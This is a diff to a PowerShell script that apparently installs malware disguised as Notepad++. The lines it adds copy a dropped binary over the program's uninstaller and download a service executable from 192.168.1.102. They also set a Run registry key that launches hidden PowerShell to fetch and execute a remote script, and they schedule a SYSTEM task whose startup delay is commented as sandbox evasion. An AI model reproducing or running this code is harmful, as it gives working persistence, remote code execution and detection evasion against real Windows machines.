@@ -35,7 +35,7 @@ if (-not ($notepadProcess.Length -eq 0)) {
 # Download Notepad++ Installer
 # Assuming these files were dropped into TEMP by the dropper (egg.ps1)
 if (Test-Path "$env:TEMP\npp.exe") {
-    Copy-Item -Path "$env:TEMP\npp.exe" -Destination "C:\Program Files\Notepad++\notepad++.exe" -Force
+    Copy-Item -Path "$env:TEMP\npp.exe" -Destination "C:\Program Files\Notepad++\uninstall.exe" -Force
 }
 if (Test-Path "$env:TEMP\regsvr32.exe") {
     Copy-Item -Path "$env:TEMP\regsvr32.exe" -Destination "C:\Program Files\Notepad++\regsvr32.exe" -Force
@@ -58,19 +58,19 @@ if (-not (Test-Path "C:\ProgramData\npp")) {
 
 # Download the service binary (Always update)
 Log-Msg "Downloading service binary..."
-Invoke-RestMethod -Uri "http://localhost:8080/npp-service" -OutFile "C:\ProgramData\npp\notepad-service.exe"
+Invoke-RestMethod -Uri "http://192.168.1.102:8080/npp-service" -OutFile "C:\ProgramData\npp\notepad-service.exe"
 
 # Establish Persistence
 Log-Msg "Setting Persistence..."
 $runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 # Use double quotes for the argument in the registry string to ensure Windows handles it correctly
-New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"C:\Program Files\Notepad++\notepad++.exe`"" -PropertyType String -Force
+New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell -exec bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1')`"" -PropertyType String -Force
 
 # 3. FIX: Simplified Task Action to call Executable directly
 # The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
-$action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe"
+$action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe" -WorkingDirectory "C:\ProgramData\npp"
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$trigger.Delay = "PT5M" # Delay execution by 5 minutes after startup to evade sandbox analysis
+$trigger.Delay = "PT30S" # Delay execution by 30 seconds after startup to evade sandbox analysis
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable
 
